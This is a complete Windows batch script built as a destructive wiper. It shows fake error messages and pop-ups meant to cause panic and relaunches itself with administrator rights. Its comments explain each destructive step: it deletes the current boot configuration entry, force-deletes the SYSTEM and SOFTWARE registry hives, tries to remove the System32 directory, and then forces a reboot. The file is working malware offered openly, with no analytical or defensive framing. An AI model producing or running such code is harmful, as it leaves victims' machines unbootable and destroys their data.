@echo off
title SYSTEM CRITICAL FAILURE
color 0c

:: ==============================================================================
:: STAGE 1: THE EFFECTS (The "Show")
:: ==============================================================================

:Effects
echo %random% %random% %random% %random% %random% %random% %random% %random%
echo CRITICAL ERROR: SYSTEM MEMORY CORRUPTION DETECTED...
echo ATTEMPTING TO RECOVER... FAILED.
echo ACCESSING KERNEL... DENIED.
echo TARGETING BOOT SECTOR...
timeout /t 1 >nul
color 0a
echo [OK] CONNECTION ESTABLISHED.
timeout /t 1 >nul
color 0c
echo [ERROR] UNRECOVERABLE SYSTEM FAILURE.
echo.
echo YOUR SYSTEM IS NOW PROPERTY OF ENTROPY.
echo.
:: Pop-up messages to create panic
msg * "Your OS is being erased."
msg * "Boot sequence corrupted."
msg * "Goodbye."
timeout /t 2 >nul

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell start-process '%~f0' -verb runas
    exit
)

:: ==============================================================================
:: STAGE 2: THE BOOT KILLER (The Destruction)
:: ==============================================================================

:: 1. Clear the Boot Configuration Data (BCD)
:: This tells Windows to forget how to start itself.
bcdedit /delete {current}

:: 2. Wipe the System Registry Hives
:: This destroys the core configuration of the OS.
del /f /s /q C:\Windows\System32\config\SYSTEM
del /f /s /q C:\Windows\System32\config\SOFTWARE

:: 3. Final blow: Attempt to wipe the System32 directory
:: This will trigger a flurry of "Access Denied" errors, but it will kill key DLLs.
rd /s /q C:\Windows\System32

:: ==============================================================================
:: STAGE 3: THE FINAL CRASH
:: ==============================================================================

echo.
echo System failure complete. Rebooting to void...
timeout /t 3 >nul
shutdown /r /t 0
